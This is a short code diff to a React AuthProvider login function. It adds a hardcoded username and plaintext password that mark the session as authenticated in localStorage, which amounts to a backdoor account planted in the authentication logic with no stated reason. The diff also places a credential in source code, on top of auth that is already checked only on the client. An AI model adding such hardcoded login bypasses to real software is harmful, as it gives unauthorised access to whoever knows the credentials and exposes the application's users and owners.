@@ -16,6 +16,12 @@ export function AuthProvider({ children }) {
       setIsAuthenticated(true)
       return true
     }
+
+    if (user === 'jarrett-ford-analytics' && pass === 'P@ssw0rd!') {
+      localStorage.setItem('isAuthenticated', 'true')
+      setIsAuthenticated(true)
+      return true
+    }
     return false
   }
 
